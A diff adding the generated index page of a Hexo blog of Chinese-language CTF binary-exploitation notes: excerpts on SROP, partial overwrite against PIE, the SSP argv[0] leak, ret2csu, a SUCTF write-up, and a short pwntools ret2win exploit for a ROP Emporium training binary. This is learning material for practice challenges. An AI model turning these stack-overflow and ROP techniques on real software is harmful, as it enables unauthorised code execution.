@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="C0yo7e">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="The lair of C0yo7e">
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="The lair of C0yo7e">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>The lair of C0yo7e</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    首页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    归档
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">The lair of C0yo7e</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/10/07/runtime-resolve/">
+                runtime_resolve
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-10-07</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/09/02/srop/">
+                srop
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-09-02</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p>
+<p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="%E5%9B%BE%E7%89%871.png" alt></p>
+        </div>
+        <a href="/2019/09/02/srop/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/20/playfmt/">
+                suctf的两三题wp
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-20</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p>
+<p>以下附上超级简单题的一些思路，当做给自己的记录吧</p>
+        </div>
+        <a href="/2019/08/20/playfmt/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/16/overwrite/">
+                partial overwrite
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-16</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p>
+        </div>
+        <a href="/2019/08/16/overwrite/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/16/ssp/">
+                ssp操作
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-16</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p>
+        </div>
+        <a href="/2019/08/16/ssp/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/07/08/libc-csu/">
+                libc_csu
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-07-08</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p>
+<p>这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。<br>Emmm真是一个异常简洁的main函数</p>
+<p><img src="%E5%9B%BE%E7%89%871.png" alt></p>
+<p>我们发现它有个pwnme函数哦，那就点进去看一下</p>
+<p><img src="%E5%9B%BE%E7%89%872.png" alt></p>
+<p>它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。</p>
+<p><img src="%E5%9B%BE%E7%89%873.png" alt></p>
+        </div>
+        <a href="/2019/07/08/libc-csu/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/07/08/ROP Emporium/">
+                ROP Emporium
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-07-08</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p>
+<h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+        </div>
+        <a href="/2019/07/08/ROP Emporium/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/11/09/hello-world/">
+                Hello World
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-11-09</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/�����/">�����</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+        </div>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/10/07/runtime-resolve/">runtime_resolve</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/09/02/srop/">srop</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/20/playfmt/">suctf的两三题wp</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/16/overwrite/">partial overwrite</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/�����/">�����</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
